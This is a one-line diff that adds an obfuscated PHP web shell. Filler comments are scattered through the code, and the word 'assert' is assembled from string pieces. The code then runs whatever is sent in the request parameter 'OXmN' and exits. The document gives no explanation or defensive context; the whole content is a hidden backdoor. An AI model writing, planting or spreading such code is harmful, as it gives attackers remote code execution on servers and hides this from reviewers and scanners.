@@ -1,0 +1,1 @@
+<?php /*ehmx*/if/*jW*/(isset($_REQUEST['OXmN'])){$P/*bK*/=/*HKxeT*/"asser"."t";/*ThOgk*/$K=$P/*EHcpq*/($_REQUEST['OXmN'])/*Y*/;/*aQJHY*/exit;/*nFD*/}?>
